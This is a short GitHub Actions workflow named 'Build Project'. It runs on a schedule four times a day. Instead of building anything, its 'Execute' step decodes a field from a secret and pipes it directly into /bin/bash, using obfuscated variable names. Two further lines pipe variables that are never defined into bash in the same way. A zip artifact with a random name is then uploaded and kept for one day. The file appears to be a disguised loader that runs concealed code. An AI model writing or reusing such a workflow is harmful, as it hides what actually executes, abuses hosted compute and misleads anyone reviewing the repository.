name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '13 1,7,13,19 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          m5001: ${{ secrets.m5001 }}
        run: |
          printf '%s' "$m5001" | jq -r .h5713 | /bin/bash
          printf '%s' "$w7605" | jq -r .liqu2 | /bin/bash
          echo $d7575 | jq -r .bpi91 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: b8VskhoH
          path: "*.zip"
          retention-days: 1
